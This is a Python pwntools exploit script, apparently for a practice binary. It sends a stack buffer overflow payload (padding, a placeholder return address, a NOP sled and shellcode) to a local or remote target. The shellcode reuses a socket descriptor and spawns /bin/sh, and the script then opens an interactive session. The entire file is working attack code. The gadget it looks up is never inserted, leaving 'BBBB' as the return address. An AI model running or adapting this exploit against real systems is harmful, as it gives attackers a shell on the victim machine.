#!/usr/bin/python3
from pwn import *
import sys

# Allows to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

gdbscript = '''
init-gef
b *0x080491d9
'''.format(**locals())

payload = (b'A' * 268
        + b'BBBB'
        + b'\x90' * 10
        + b'\x31\xdb\xb3\x03\x31\xc9\xb1\x03\xfe\xc9\x31\xc0\xb0\x3f\xcd\x80\x80\xf9\xff\x75\xf3\x31\xc9\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80'
        + b'C' * 60
        )

with open("jmpesp", "wb") as f:
    f.write(payload)

exe = sys.argv[1]
# this will auto get proper arch, os etc:
elf = context.binary = ELF(exe, checksec=False)

with open("/dev/null") as err:
    io = start()
    # change logging level to help with debugging:
    context.log_level = 'debug'
    rop = ROP(elf)
    esptruc = rop.esp
    print(f"ESP gadget = {esptruc}")
    print(f"ESP truc address = {esptruc.address}")
    print(rop.dump())
    io.send(payload)
    # interactive mode to interact with the binary, not GDB:
    io.interactive()
